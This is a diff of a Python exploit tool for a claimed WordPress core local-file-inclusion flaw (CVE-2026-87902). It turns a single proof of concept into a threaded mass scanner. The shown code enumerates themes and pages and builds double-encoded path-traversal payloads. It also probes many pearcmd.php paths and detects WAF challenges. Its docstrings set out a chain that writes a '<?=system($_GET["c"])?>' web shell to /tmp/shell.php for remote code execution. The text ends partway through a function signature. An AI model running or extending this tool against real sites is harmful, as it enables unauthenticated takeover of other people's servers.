@@ -1,556 +1,987 @@
 #!/usr/bin/env python3
 """
 CVE-2026-87902 — WordPress Core LFI via locate_template()
+Affects: WordPress <= 7.1.1 (unauthenticated)
 
-Affected : WordPress <= 7.1.1 (unauthenticated)
-Type     : Local File Inclusion → Remote Code Execution
-CVSS     : 9.8 (Critical)
+locate_template() resolves caller-supplied template name without verifying
+it stays within the theme directory. Double URL-encoding bypasses the single
+urldecode() sanitization: %252e%252e -> HTTP decode -> %2e%2e -> WP urldecode -> ..
 
-Root cause
-----------
-locate_template() resolves a caller-supplied template name against the active
-theme directory using realpath() but never verifies the resolved path stays
-inside that directory. get_page_template() feeds it a name built directly from
-the URL query variable 'pagename' (url-decoded, not sanitized), so:
-
-  GET /?pagename=templates%252F%252e%252e%252F%252e%252e%252F…%252Ftarget
-
-  HTTP layer decodes %25 → %:
-  → pagename = templates%2F%2e%2e%2F%2e%2e%2F…%2Ftarget
-
-  WordPress URL-decodes the pagename parameter:
-  → template name : page-templates/../../…/target.php
-  → realpath()    : /absolute/path/to/target.php   ← arbitrary include
-
-  Double-encoding (%252e%252e) is required because single encoding (%2e%2e)
-  is already consumed by the HTTP layer; WordPress never sees the dots.
-
-Requirements
-------------
-  (1) The active theme must contain a top-level directory whose name starts
-      with 'page-' (e.g. page-templates in Twenty Twelve, Twenty Fourteen,
-      hello-elementor, Neve, Hestia, Sydney).  realpath() needs each path
-      component to exist.
-  (2) For RCE: a readable pearcmd.php with register_argc_argv = On
-      (default in the official PHP Docker image and cPanel PHP < 8.5).
-  (3) The target page must use the 'default' template (not Elementor or
-      another page-builder override) so get_page_template() returns the
-      traversal path rather than the builder's own template.
-
-RCE chain (pearcmd trick)
--------------------------
-When register_argc_argv=On, PHP maps the URL query string into $argv.
-Including pearcmd.php via LFI therefore runs an arbitrary PEAR command:
-
-  ?page_id=N&pagename=<lfi>&+config-create+<?=system($_GET["c"])?>+&/tmp/shell.php
-
-  → $argv = ['pearcmd.php', 'config-create', '<?=system($_GET["c"])?>', '/tmp/shell.php']
-  → PEAR writes a config stub (containing the PHP payload) to /tmp/shell.php
-  → A second LFI inclusion of that stub achieves code execution
+Phases:
+  1. WordPress version & environment detection
+  2. Theme enumeration (active + passive, threaded)
+  3. Page discovery (REST API / sitemap / brute, threaded)
+  4. Template validation (only pages with default/empty template)
+  5. LFI probe (all combos: pages x themes x depths x pearcmd paths, threaded)
+  6. RCE chain (pearcmd config-create + second-stage LFI) [--rce]
 """
 
+from __future__ import annotations
+
 import argparse
+import concurrent.futures
+import json
+import re
 import sys
+import time
 import urllib.parse
+from dataclasses import dataclass, field
 from typing import Optional
+from xml.etree import ElementTree
 
 import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
 # ---------------------------------------------------------------------------
 # Constants
 # ---------------------------------------------------------------------------
 
-BANNER = """
- ██████╗██╗   ██╗███████╗    ██████╗  ██████╗  ██████╗ ██████╗ ███████╗
-██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗██╔════╝ ╚════██╗╚════██╗
-██║     ██║   ██║█████╗       █████╔╝██║██╔██║███████╗  █████╔╝ █████╔╝
-██║     ╚██╗ ██╔╝██╔══╝      ██╔══██╗████╔╝██║██╔═══██╗██╔══██╗██╔═══╝
-╚██████╗ ╚████╔╝ ███████╗    ██████╔╝╚██████╔╝╚██████╔╝███████║███████╗
- ╚═════╝  ╚═══╝  ╚══════╝    ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
+KNOWN_THEMES: list[str] = [
+    "twentytwelve", "twentythirteen", "twentyfourteen", "twentyfifteen",
+    "twentysixteen", "twentyseventeen", "twentynineteen", "twentytwenty",
+    "twentytwentyone", "twentytwentytwo", "twentytwentythree", "twentytwentyfour",
+    "hello-elementor", "astra", "neve", "hestia", "sydney",
+    "oceanwp", "generatepress", "storefront", "zakra", "blocksy",
+    "kadence", "flatsome", "enfold", "bridge", "salient",
+    "divi", "avada", "betheme", "jupiter", "the7",
+]
 
-  CVE-2026-87902  WordPress LFI via locate_template()  WordPress <= 7.1.1
-  Unauthenticated · LFI → RCE (pearcmd + register_argc_argv=On)
-"""
+KNOWN_PAGE_DIRS: list[str] = [
+    "page-templates", "page-layouts", "page-builder",
+    "page-sections", "page-parts",
+]
 
-# Themes that ship with a top-level 'page-*' directory out of the box
-THEME_PAGE_DIRS: dict[str, str] = {
-    "twentytwelve":   "page-templates",
-    "twentyfourteen": "page-templates",
-    "neve":           "page-templates",
-    "hestia":         "page-templates",
-    "sydney":         "page-templates",
+# suffix = URL segment used when requesting the template
+PAGE_DIR_TO_SUFFIX: dict[str, str] = {
+    "page-templates": "templates",
+    "page-layouts":   "page-layouts",
+    "page-builder":   "page-builder",
+    "page-sections":  "page-sections",
+    "page-parts":     "page-parts",
 }
 
-# pearcmd.php candidate paths (most common first)
+TRAVERSAL_DEPTHS: list[int] = [7, 8, 9, 10, 11]
+
 PEARCMD_PATHS: list[str] = [
-    "/usr/local/lib/php/pearcmd",              # PHP Docker image default
-    "/usr/share/php/pearcmd",                  # Debian / Ubuntu system PHP
-    "/usr/lib/php/pearcmd",                    # RHEL / CentOS
-    "/usr/local/share/php/pearcmd",            # FreeBSD ports
-    "/opt/alt/php74/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 7.4
-    "/opt/alt/php80/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 8.0
-    "/opt/alt/php81/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 8.1
-    "/opt/alt/php82/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 8.2
-    "/opt/alt/php83/usr/share/pear/pearcmd",   # cPanel / CloudLinux PHP 8.3
-    "/opt/cpanel/ea-php74/root/usr/share/pear/pearcmd",  # cPanel EasyApache PHP 7.4
-    "/opt/cpanel/ea-php81/root/usr/share/pear/pearcmd",  # cPanel EasyApache PHP 8.1
+    "/usr/local/lib/php/pearcmd",
+    "/usr/share/php/pearcmd",
+    "/usr/lib/php/pearcmd",
+    "/usr/local/share/php/pearcmd",
+    "/opt/alt/php70/usr/share/pear/pearcmd",
+    "/opt/alt/php71/usr/share/pear/pearcmd",
+    "/opt/alt/php72/usr/share/pear/pearcmd",
+    "/opt/alt/php73/usr/share/pear/pearcmd",
+    "/opt/alt/php74/usr/share/pear/pearcmd",
+    "/opt/alt/php80/usr/share/pear/pearcmd",
+    "/opt/alt/php81/usr/share/pear/pearcmd",
+    "/opt/alt/php82/usr/share/pear/pearcmd",
+    "/opt/alt/php83/usr/share/pear/pearcmd",
+    "/opt/alt/php84/usr/share/pear/pearcmd",
+    "/opt/cpanel/ea-php70/root/usr/share/pear/pearcmd",
+    "/opt/cpanel/ea-php71/root/usr/share/pear/pearcmd",
+    "/opt/cpanel/ea-php72/root/usr/share/pear/pearcmd",
+    "/opt/cpanel/ea-php73/root/usr/share/pear/pearcmd",
+    "/opt/cpanel/ea-php74/root/usr/share/pear/pearcmd",
+    "/opt/cpanel/ea-php80/root/usr/share/pear/pearcmd",
+    "/opt/cpanel/ea-php81/root/usr/share/pear/pearcmd",
+    "/opt/cpanel/ea-php82/root/usr/share/pear/pearcmd",
+    "/opt/cpanel/ea-php83/root/usr/share/pear/pearcmd",
+    "/opt/cpanel/ea-php84/root/usr/share/pear/pearcmd",
 ]
 
-# Strings that confirm /etc/passwd was included
-PASSWD_INDICATORS: list[str] = [
-    "root:x:", "root:!", "daemon:", "nobody:", "/bin/bash", "/bin/sh",
-    "/sbin/nologin", "/usr/sbin/nologin",
+PEAR_SUCCESS_INDICATORS: list[str] = [
+    "Writing PEAR configuration file",
+    "pear_config",
+    "PEAR_Config",
+    "default_channel",
+    "preferred_state",
+    "<default_channel>",
+    "pear.php.net",
 ]
 
-# Strings that indicate a WAF / bot-challenge interception (not real WP response)
-BOT_CHALLENGE_INDICATORS: list[str] = [
-    "One moment, please",          # Imunify360 JS challenge
-    "window.location.reload()",    # Imunify360 reload trick
-    "Ray ID",                      # Cloudflare challenge
-    "cf-browser-verification",     # Cloudflare
-    "Checking your browser",       # Cloudflare / generic WAF
-    "DDoS protection by",          # Generic WAF
-    "Enable JavaScript and cookies",  # Generic bot challenge
-    "__cf_chl",                    # Cloudflare cookie name
-    "security check",              # Generic
+WAF_CHALLENGE_INDICATORS: list[str] = [
+    "One moment, please",
+    "window.location.reload()",
+    "Ray ID",
+    "cf-browser-verification",
+    "Checking your browser",
+    "DDoS protection by",
+    "Enable JavaScript and cookies",
+    "__cf_chl",
+    "security check",
+    "Attention Required",
+    "imunify",
+    "Imunify",
 ]
 
 LITESPEED_403_INDICATORS: list[str] = [
     "Proudly powered by LiteSpeed Web Server",
     "LiteSpeed Technologies",
+    "lsws",
 ]
 
-# Specific PEAR output markers (much tighter than bare "config")
-PEAR_SUCCESS_INDICATORS: list[str] = [
-    "Writing PEAR configuration file",
-    "pear_config",                 # XML root element in the config stub
-    "PEAR_Config",
-    "default_channel",             # key that PEAR always writes
-    "preferred_state",             # another PEAR config key
+ELEMENTOR_TEMPLATES: list[str] = [
+    "elementor_header_footer",
+    "elementor",
+    "elementor-canvas",
+    "elementor-full-width",
 ]
 
+DEFAULT_TIMEOUT: int = 15
+DEFAULT_THREADS: int = 10
 
 # ---------------------------------------------------------------------------
-# Payload helpers
+# Data structures
 # ---------------------------------------------------------------------------
 
-def build_lfi_payload(suffix: str, depth: int, target: str) -> str:
-    """
-    Build the 'pagename' query-parameter value that causes the LFI.
-
-    suffix  – part of the theme's page-* dir after 'page-'
-              e.g. 'templates' → theme contains 'page-templates/'
-    depth   – number of ../ hops from the page-* dir to filesystem root
-              (9 covers the cPanel layout:
-               /home/<user>/domains/<host>/public_html/wp-content/themes/<name>/)
-    target  – absolute path to include, WITHOUT the trailing .php extension
-              (locate_template appends '.php' automatically)
-
-    Double-encoding is required:
-      %252e%252e → HTTP layer decodes %25 → %2e%2e → WordPress decodes → ..
-      %252F      → HTTP layer decodes %25 → %2F → WordPress decodes → /
-    Single encoding (%2e%2e) is consumed by the HTTP layer and never reaches
-    WordPress's URL decode step, so path traversal fails.
-
-    Example
-    -------
-    build_lfi_payload('templates', 9,
-                      '/opt/alt/php74/usr/share/pear/pearcmd')
-    → 'templates%252F%252e%252e%252F...%252Fopt%252Falt%252Fphp74%252Fusr%252Fshare%252Fpear%252Fpearcmd'
-    WordPress constructs:
-      page-templates/../../…/opt/alt/php74/usr/share/pear/pearcmd.php  ✓
-    """
-    # Double-encoded path separator and dot-dot
-    sep = "%252F"
-    dd  = "%252e%252e"
-    hops = (sep + dd) * depth
-    # Double-encode each "/" in the target path as well
-    encoded_target = target.lstrip("/").replace("/", sep)
-    return f"templates{hops}{sep}{encoded_target}"
+@dataclass
+class ThemeInfo:
+    name: str
+    page_dir: str   # e.g. "page-templates"
+    suffix: str     # e.g. "templates"  (URL segment)
+    active: bool = False
 
 
-def strip_php(path: str) -> str:
-    """Remove trailing .php so locate_template's auto-append works correctly."""
-    return path[:-4] if path.endswith(".php") else path
+@dataclass
+class PageInfo:
+    page_id: int
+    slug: str = ""
+    template: str = ""
+    title: str = ""
+
+
+@dataclass
+class LFIResult:
+    confirmed: bool
+    page: Optional[PageInfo] = None
+    theme: Optional[ThemeInfo] = None
+    depth: int = 0
+    pearcmd_used: str = ""
+    lfi_url: str = ""
+    waf_blocked: bool = False
+    waf_type: str = ""
+
+
+@dataclass
+class RCEResult:
+    confirmed: bool
+    shell_path: str = ""
+    pearcmd_used: str = ""
+    execute_url: str = ""
+    uid_output: str = ""
+
+
+@dataclass
+class ScanResult:
+    target: str
+    wp_version: Optional[str] = None
+    server_header: str = ""
+    themes: list = field(default_factory=list)
+    pages: list = field(default_factory=list)
+    lfi: Optional[LFIResult] = None
+    rce: Optional[RCEResult] = None
+    waf_detected: bool = False
+    waf_type: str = ""
 
 
 # ---------------------------------------------------------------------------
-# Network helpers
+# Helpers
 # ---------------------------------------------------------------------------
 
-def make_session(
-    ua: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-              "AppleWebKit/537.36 (KHTML, like Gecko) "
-              "Chrome/126.0.0.0 Safari/537.36",
-    cookies: Optional[str] = None,
-    extra_headers: Optional[list[str]] = None,
-) -> requests.Session:
+def make_session(extra_headers: dict, cookie: str, verify_ssl: bool = False) -> requests.Session:
     s = requests.Session()
-    s.headers["User-Agent"] = ua
-    # Defeat caching layers (LiteSpeed, Varnish, Nginx proxy cache, etc.)
-    s.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
-    s.headers["Pragma"] = "no-cache"
-    # Extra headers (e.g. to pass WAF bypass tokens)
-    if extra_headers:
-        for h in extra_headers:
-            if ":" in h:
-                k, v = h.split(":", 1)
-                s.headers[k.strip()] = v.strip()
-    # Cookie string (e.g. from a real browser that solved a JS challenge)
-    if cookies:
-        for pair in cookies.split(";"):
-            pair = pair.strip()
-            if "=" in pair:
-                k, v = pair.split("=", 1)
-                s.cookies.set(k.strip(), v.strip())
+    retry = Retry(total=2, backoff_factor=0.5,
+                  status_forcelist=[429, 500, 502, 503, 504])
+    adapter = HTTPAdapter(max_retries=retry)
+    s.mount("http://", adapter)
+    s.mount("https://", adapter)
+    s.verify = verify_ssl
+    s.headers.update({
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Cache-Control": "no-cache, no-store, must-revalidate",
+        "Pragma": "no-cache",
+    })
+    if cookie:
+        s.headers["Cookie"] = cookie
+    s.headers.update(extra_headers)
     return s
 
 
-def probe_theme_dirs(base_url: str, session: requests.Session) -> Optional[str]:
+def build_payload(suffix: str, depth: int, target: str) -> str:
     """
-    Return the page-* directory suffix for the first matching theme, or None.
-    Checks /wp-content/themes/<theme>/<page-dir>/ for HTTP 200 or 403.
+    Build double-encoded path traversal payload.
+    %252e%252e -> (HTTP decode) -> %2e%2e -> (WP urldecode) -> ..
+    Uses suffix parameter — NOT hardcoded.
     """
-    for theme, page_dir in THEME_PAGE_DIRS.items():
-        url = f"{base_url}/wp-content/themes/{theme}/{page_dir}/"
+    sep = "%252F"
+    dd  = "%252e%252e"
+    hops = (sep + dd) * depth
+    encoded_target = target.lstrip("/").replace("/", sep)
+    return f"{suffix}{hops}{sep}{encoded_target}"
+
+
+def build_url(base: str, page_id: int, slug: str, pagename_value: str, port: int) -> str:
+    """
+    Construct a raw URL bypassing requests param encoding.
+    Uses page_id + pagename to avoid canonical redirects.
+    """
+    from urllib.parse import urlparse, urlunparse
+    parsed = urlparse(base)
+    netloc = parsed.netloc
+    if port and port not in (80, 443):
+        host = parsed.hostname
+        netloc = f"{host}:{port}"
+    qs = f"page_id={page_id}&pagename={pagename_value}"
+    return urlunparse((parsed.scheme, netloc, parsed.path or "/", "", qs, ""))
+
+
+def detect_waf(text: str, headers: dict) -> tuple[bool, str]:
+    text_lower = text.lower()
+    for ind in WAF_CHALLENGE_INDICATORS:
+        if ind.lower() in text_lower:
+            return True, "Cloudflare/Imunify360"
+    server = headers.get("Server", "")
+    if "imunify" in server.lower():
+        return True, "Imunify360"
+    return False, ""
+
+
+def is_litespeed_403(text: str, status: int) -> bool:
+    if status != 403:
+        return False
+    for ind in LITESPEED_403_INDICATORS:
+        if ind.lower() in text.lower():
+            return True
+    return False
+
+
+def is_pear_response(text: str) -> bool:
+    for ind in PEAR_SUCCESS_INDICATORS:
+        if ind in text:
+            return True
+    return False
+
+
+def is_rce_confirmed(text: str) -> bool:
+    return bool(re.search(r"uid=\d+\(", text))
+
+
+# ---------------------------------------------------------------------------
+# Phase 1 — WordPress version & environment detection
+# ---------------------------------------------------------------------------
+
+def detect_wordpress(session: requests.Session, base: str, verbose: bool) -> tuple[Optional[str], str]:
+    wp_version = None
+    server_header = ""
+
+    endpoints = [base, f"{base.rstrip('/')}/feed/", f"{base.rstrip('/')}/wp-json/"]
+    for url in endpoints:
+        try:
+            r = session.get(url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
+            if not server_header:
+                server_header = r.headers.get("Server", "")
+            m = re.search(
+                r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']WordPress ([0-9.]+)["\']',
+                r.text, re.I,
+            )
+            if m:
+                wp_version = m.group(1)
+                break
+            m = re.search(r'<generator>[^<]*WordPress/([0-9.]+)</generator>', r.text)
+            if m:
+                wp_version = m.group(1)
+                break
+        except Exception:
+            continue
+
+    if verbose:
+        print(f"  [*] WP version: {wp_version or 'unknown'}  Server: {server_header}")
+    return wp_version, server_header
+
+
+# ---------------------------------------------------------------------------
+# Phase 2 — Theme enumeration
+# ---------------------------------------------------------------------------
+
+def extract_active_theme(session: requests.Session, base: str, verbose: bool) -> Optional[ThemeInfo]:
+    try:
+        r = session.get(base, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
+    except Exception:
+        return None
+
+    m = re.search(r'/wp-content/themes/([^/\'"]+)/', r.text)
+    if not m:
+        return None
+    theme_name = m.group(1)
+    if verbose:
+        print(f"  [+] Active theme from HTML: {theme_name}")
+
+    page_dir = _probe_page_dir(session, base, theme_name, verbose)
+    suffix = PAGE_DIR_TO_SUFFIX.get(page_dir, page_dir)
+    return ThemeInfo(name=theme_name, page_dir=page_dir, suffix=suffix, active=True)
+
+
+def _probe_page_dir(session: requests.Session, base: str, theme: str, verbose: bool) -> str:
+    for pdir in KNOWN_PAGE_DIRS:
+        url = f"{base.rstrip('/')}/wp-content/themes/{theme}/{pdir}/"
         try:
             r = session.get(url, timeout=8, allow_redirects=False)
             if r.status_code in (200, 403):
-                suffix = page_dir[len("page-"):]
-                print(f"[+] Vulnerable theme dir found: {page_dir}  (theme: {theme})")
-                return suffix
-        except requests.RequestException:
+                if verbose:
+                    print(f"    [*] Theme page-dir: {pdir} (HTTP {r.status_code})")
+                return pdir
+        except Exception:
             pass
-    return None
+    return "page-templates"
 
 
-def request_lfi(
-    base_url: str,
-    pagename: str,
-    session: requests.Session,
-    page_id: Optional[int] = None,
-    port: Optional[int] = None,
-) -> Optional[requests.Response]:
-    """
-    Fire the LFI request; return the Response or None on network error.
+def enumerate_themes(session: requests.Session, base: str, active: Optional[ThemeInfo],
+                     thorough: bool, threads: int, verbose: bool) -> list[ThemeInfo]:
+    themes: list[ThemeInfo] = []
+    seen: set[str] = set()
 
-    page_id, when given, is appended as ?page_id=N so WordPress routes the
-    request through get_page_template() for a known post rather than treating
-    the pagename as a fresh slug lookup (which may 301-redirect or miss the
-    hook entirely).
+    if active:
+        themes.append(active)
+        seen.add(active.name)
 
-    The pagename value is already double-encoded, so we pass it verbatim via
-    a hand-crafted URL to prevent requests from double-encoding it again.
-
-    port, when set, overrides the port in base_url (e.g. 8080 for the Apache
-    backend on cPanel servers that run LiteSpeed in front of Apache).
-    """
+    # try directory listing
+    listing_url = f"{base.rstrip('/')}/wp-content/themes/"
     try:
-        target = base_url
-        if port is not None:
-            from urllib.parse import urlparse, urlunparse
-            p = urlparse(base_url)
-            target = urlunparse(p._replace(netloc=f"{p.hostname}:{port}"))
-        if page_id is not None:
-            raw_url = f"{target}/?page_id={page_id}&pagename={pagename}"
-        else:
-            raw_url = f"{target}/?pagename={pagename}"
-        return session.get(raw_url, timeout=15, allow_redirects=True)
-    except requests.RequestException as exc:
-        print(f"[-] Request failed: {exc}")
+        r = session.get(listing_url, timeout=10, allow_redirects=True)
+        if r.status_code == 200:
+            for m in re.finditer(r'href=["\']([A-Za-z0-9_\-]+)[/"\']+', r.text):
+                name = m.group(1)
+                if name in (".", "..", "") or name in seen or len(name) < 3:
+                    continue
+                page_dir = _probe_page_dir(session, base, name, verbose)
+                suffix = PAGE_DIR_TO_SUFFIX.get(page_dir, page_dir)
+                themes.append(ThemeInfo(name=name, page_dir=page_dir, suffix=suffix, active=False))
+                seen.add(name)
+                if verbose:
+                    print(f"  [+] Installed theme: {name}")
+    except Exception:
+        pass
+
+    if thorough:
+        def probe_known(tname: str):
+            if tname in seen:
+                return None
+            url = f"{base.rstrip('/')}/wp-content/themes/{tname}/"
+            try:
+                r = session.get(url, timeout=8, allow_redirects=False)
+                if r.status_code in (200, 403):
+                    page_dir = _probe_page_dir(session, base, tname, verbose)
+                    suffix = PAGE_DIR_TO_SUFFIX.get(page_dir, page_dir)
+                    return ThemeInfo(name=tname, page_dir=page_dir, suffix=suffix, active=False)
+            except Exception:
+                pass
+            return None
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
+            futures = {ex.submit(probe_known, t): t for t in KNOWN_THEMES if t not in seen}
+            for f in concurrent.futures.as_completed(futures):
+                result = f.result()
+                if result:
+                    themes.append(result)
+                    seen.add(result.name)
+                    if verbose:
+                        print(f"  [+] Probed theme: {result.name}")
+
+    if not themes:
+        themes.append(ThemeInfo(name="twentytwentyfour", page_dir="page-templates",
+                                suffix="templates", active=False))
+        if verbose:
+            print("  [!] No themes found; using fallback: twentytwentyfour")
+
+    return themes
+
+
+# ---------------------------------------------------------------------------
+# Phase 3 — Page discovery
+# ---------------------------------------------------------------------------
+
+def discover_pages_rest(session: requests.Session, base: str, verbose: bool) -> list[PageInfo]:
+    pages = []
+    url = f"{base.rstrip('/')}/wp-json/wp/v2/pages"
+    params: dict = {"per_page": 100, "_fields": "id,slug,template,status,title", "page": 1}
+    try:
+        while True:
+            r = session.get(url, params=params, timeout=DEFAULT_TIMEOUT)
+            if r.status_code != 200:
+                break
+            try:
+                data = r.json()
+            except Exception:
+                break
+            if not isinstance(data, list) or not data:
+                break
+            for item in data:
+                pid = item.get("id", 0)
+                slug = item.get("slug", "")
+                tmpl = item.get("template", "")
+                title_raw = item.get("title", {})
+                title = title_raw.get("rendered", "") if isinstance(title_raw, dict) else str(title_raw)
+                if item.get("status") != "publish":
+                    continue
+                pages.append(PageInfo(page_id=pid, slug=slug, template=tmpl, title=title))
+            total_pages = int(r.headers.get("X-WP-TotalPages", 1))
+            if params["page"] >= total_pages:
+                break
+            params["page"] += 1
+    except Exception:
+        pass
+    if verbose:
+        print(f"  [*] REST API: found {len(pages)} pages")
+    return pages
+
+
+def discover_pages_sitemap(session: requests.Session, base: str, verbose: bool) -> list[PageInfo]:
+    pages = []
+    found_ids: set[int] = set()
+
+    sitemap_urls = [
+        f"{base.rstrip('/')}/sitemap.xml",
+        f"{base.rstrip('/')}/sitemap_index.xml",
+        f"{base.rstrip('/')}/wp-sitemap.xml",
+    ]
+
+    page_urls: list[str] = []
+    for smap in sitemap_urls:
+        try:
+            r = session.get(smap, timeout=10)
+            if r.status_code != 200:
+                continue
+            try:
+                root = ElementTree.fromstring(r.content)
+            except Exception:
+                continue
+            ns = {"sm": "http://www.sitemaps.org/schemas/sitemap/0.9"}
+            for loc in root.findall(".//sm:loc", ns):
+                page_urls.append(loc.text.strip())
+        except Exception:
+            continue
+
+    for purl in page_urls:
+        if "page" not in purl.lower():
+            continue
+        try:
+            r = session.get(purl, timeout=10)
+            if r.status_code != 200:
+                continue
+            try:
+                root = ElementTree.fromstring(r.content)
+            except Exception:
+                continue
+            ns = {"sm": "http://www.sitemaps.org/schemas/sitemap/0.9"}
+            for loc in root.findall(".//sm:loc", ns):
+                href = loc.text.strip()
+                m = re.search(r'[?&]page_id=(\d+)', href)
+                if m:
+                    pid = int(m.group(1))
+                    if pid not in found_ids:
+                        found_ids.add(pid)
+                        slug = href.rstrip("/").split("/")[-1]
+                        pages.append(PageInfo(page_id=pid, slug=slug))
+        except Exception:
+            continue
+
+    if verbose and pages:
+        print(f"  [*] Sitemap: found {len(pages)} page IDs")
+    return pages
+
+
+def discover_pages_brute(session: requests.Session, base: str,
+                         max_id: int, threads: int, verbose: bool) -> list[PageInfo]:
+    found: list[PageInfo] = []
+
+    def probe(pid: int):
+        url = f"{base.rstrip('/')}/?page_id={pid}"
+        try:
+            r = session.head(url, timeout=8, allow_redirects=True)
+            if r.status_code == 200:
+                final = r.url
+                slug = final.rstrip("/").split("/")[-1]
+                if slug.isdigit() or not slug:
+                    slug = ""
+                return PageInfo(page_id=pid, slug=slug)
+        except Exception:
+            pass
         return None
 
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
+        futures = {ex.submit(probe, pid): pid for pid in range(1, max_id + 1)}
+        for f in concurrent.futures.as_completed(futures):
+            result = f.result()
+            if result:
+                found.append(result)
 
-def detect_bot_challenge(body: str) -> bool:
-    """Return True when the response is a WAF/bot-challenge page, not WordPress."""
-    return any(ind in body for ind in BOT_CHALLENGE_INDICATORS)
-
-
-def detect_litespeed_block(status: int, body: str) -> bool:
-    """Return True when LiteSpeed's WAF returned a 403 for the encoded payload."""
-    return status == 403 and any(ind in body for ind in LITESPEED_403_INDICATORS)
-
-
-def confirm_lfi(body: str) -> bool:
-    """Return True when the response body contains /etc/passwd artefacts."""
-    return any(ind in body for ind in PASSWD_INDICATORS)
+    found.sort(key=lambda p: p.page_id)
+    if verbose:
+        print(f"  [*] Brute-force (1-{max_id}): found {len(found)} pages")
+    return found
 
 
-# ---------------------------------------------------------------------------
-# RCE via pearcmd.php
-# ---------------------------------------------------------------------------
+def fetch_page_templates(session: requests.Session, base: str,
+                         pages: list[PageInfo], threads: int, verbose: bool) -> list[PageInfo]:
+    need_template = [p for p in pages if p.template == "" and p.page_id > 0]
+    if not need_template:
+        return pages
 
-def attempt_pearcmd_rce(
-    base_url: str,
-    suffix: str,
-    depth: int,
-    write_path: str,
-    session: requests.Session,
-    page_id: Optional[int] = None,
-    cmd_payload: str = '<?=system($_GET["c"])?>',
-    port: Optional[int] = None,
-) -> Optional[str]:
-    """
-    Try each known pearcmd.php path.
-
-    On success, writes a PEAR config stub (containing cmd_payload) to
-    write_path and returns the pearcmd path that worked.
-    Returns None if all candidates fail.
-
-    Mechanism
-    ---------
-    register_argc_argv=On causes PHP to split the raw query string on '+'
-    and populate $argv with the resulting tokens.  PEAR's config-create
-    command writes a serialised config file:
-
-      GET /?page_id=N&pagename=<lfi>&+config-create+<cmd_payload>&<write_path>
-      $argv → ['pearcmd.php', 'config-create', '<cmd_payload>', '<write_path>']
-      PEAR  → writes stub to <write_path>
-
-    The stub embeds cmd_payload inside PEAR's XML envelope, which PHP
-    executes when the file is later included via a second LFI request.
-
-    Double-encoding note
-    --------------------
-    The pagename value from build_lfi_payload() is already double-encoded.
-    We pass it raw in the URL so the HTTP layer performs the first decode
-    (leaving single-encoded %2e%2e / %2F), which WordPress then decodes
-    into the actual traversal dots and slashes.
-    """
-    for pearcmd in PEARCMD_PATHS:
-        payload = build_lfi_payload(suffix, depth, pearcmd)
-        encoded_write = urllib.parse.quote(write_path, safe="")
-        encoded_cmd   = urllib.parse.quote(cmd_payload, safe="")
-        target = base_url
-        if port is not None:
-            from urllib.parse import urlparse, urlunparse
-            p = urlparse(base_url)
-            target = urlunparse(p._replace(netloc=f"{p.hostname}:{port}"))
-        if page_id is not None:
-            raw_url = (
-                f"{target}/?page_id={page_id}"
-                f"&pagename={payload}"
-                f"&+config-create+{encoded_cmd}&{encoded_write}"
-            )
-        else:
-            raw_url = (
-                f"{target}/?pagename={payload}"
-                f"&+config-create+{encoded_cmd}&{encoded_write}"
-            )
+    def fetch_template(page: PageInfo):
+        url = f"{base.rstrip('/')}/wp-json/wp/v2/pages/{page.page_id}?_fields=template"
         try:
-            r = session.get(raw_url, timeout=15)
-            if detect_bot_challenge(r.text):
-                print(f"    [!] WAF/bot-challenge intercepted — see bypass note below")
-                return None
-            if r.status_code == 200 and any(
-                ind in r.text for ind in PEAR_SUCCESS_INDICATORS
-            ):
-                return pearcmd + ".php"
-        except requests.RequestException:
+            r = session.get(url, timeout=8)
+            if r.status_code == 200:
+                data = r.json()
+                page.template = data.get("template", "")
+        except Exception:
             pass
+        return page
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
+        futures = [ex.submit(fetch_template, p) for p in need_template]
+        for f in concurrent.futures.as_completed(futures):
+            f.result()
+
+    return pages
+
+
+def discover_pages(session: requests.Session, base: str, thorough: bool,
+                   threads: int, verbose: bool) -> list[PageInfo]:
+    all_pages: list[PageInfo] = []
+    seen_ids: set[int] = set()
+
+    rest_pages = discover_pages_rest(session, base, verbose)
+    for p in rest_pages:
+        if p.page_id not in seen_ids:
+            all_pages.append(p)
+            seen_ids.add(p.page_id)
+
+    sitemap_pages = discover_pages_sitemap(session, base, verbose)
+    for p in sitemap_pages:
+        if p.page_id not in seen_ids:
+            all_pages.append(p)
+            seen_ids.add(p.page_id)
+
+    if thorough:
+        brute_pages = discover_pages_brute(session, base, max_id=200, threads=threads, verbose=verbose)
+        for p in brute_pages:
+            if p.page_id not in seen_ids:
+                all_pages.append(p)
+                seen_ids.add(p.page_id)
+
+    if not all_pages:
+        all_pages.append(PageInfo(page_id=1, slug="sample-page"))
+        if verbose:
+            print("  [!] No pages found; using fallback page_id=1")
+
+    all_pages = fetch_page_templates(session, base, all_pages, threads, verbose)
+    return all_pages
+
+
+# ---------------------------------------------------------------------------
+# Phase 4 — Template validation
+# ---------------------------------------------------------------------------
+
+def filter_exploitable_pages(pages: list[PageInfo], verbose: bool) -> list[PageInfo]:
+    exploitable = []
+    for p in pages:
+        tmpl = p.template.strip().lower()
+        if tmpl in ("", "default"):
+            exploitable.append(p)
+        else:
+            if verbose:
+                print(f"  [-] Skipping page {p.page_id} ({p.slug}): template={p.template}")
+    if verbose:
+        print(f"  [*] Exploitable pages (default template): {len(exploitable)}")
+    return exploitable
+
+
+# ---------------------------------------------------------------------------
+# Phase 5 — LFI probe
+# ---------------------------------------------------------------------------
+
+def _lfi_probe_single(session: requests.Session, base: str, page: PageInfo,
+                      theme: ThemeInfo, depth: int, pearcmd_path: str,
